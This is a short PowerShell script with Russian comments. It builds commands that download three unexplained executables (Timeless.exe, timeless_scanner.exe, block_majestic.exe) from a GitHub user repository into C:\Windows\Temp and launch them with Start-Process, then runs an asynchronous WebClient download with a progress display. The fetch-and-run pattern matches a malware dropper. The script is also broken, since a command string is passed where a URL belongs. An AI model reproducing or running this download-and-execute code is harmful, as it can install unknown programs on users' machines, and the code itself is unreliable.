$URL = "(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe','C:\Windows\Temp\Timeless.exe')
Start-Process 'C:\Windows\Temp\Timeless.exe'"
$URL = "(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe','C:\Windows\Temp\timeless_scanner.exe')
Start-Process 'C:\Windows\Temp\timeless_scanner.exe'"
$URL = "(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe','C:\Windows\Temp\block_majestic.exe')
Start-Process 'C:\Windows\Temp\block_majestic.exe'"
$Output = "$env:TEMP\downloaded_file.tmp"

$webClient = New-Object System.Net.WebClient

# Прогресс во время загрузки
$webClient.add_DownloadProgressChanged({
    Write-Progress -Activity "Загрузка..." `
                   -Status "$($_.ProgressPercentage)% завершено" `
                   -PercentComplete $_.ProgressPercentage
})

# Когда загрузка завершена
$webClient.add_DownloadFileCompleted({
    Write-Progress -Activity "Загрузка..." -Status "Готово" -Completed
    Write-Host "Файл загружен!" -ForegroundColor Green
})

# Асинхронная загрузка (нужна для работы событий)
$task = $webClient.DownloadFileTaskAsync($URL, $Output)
$task.Wait()
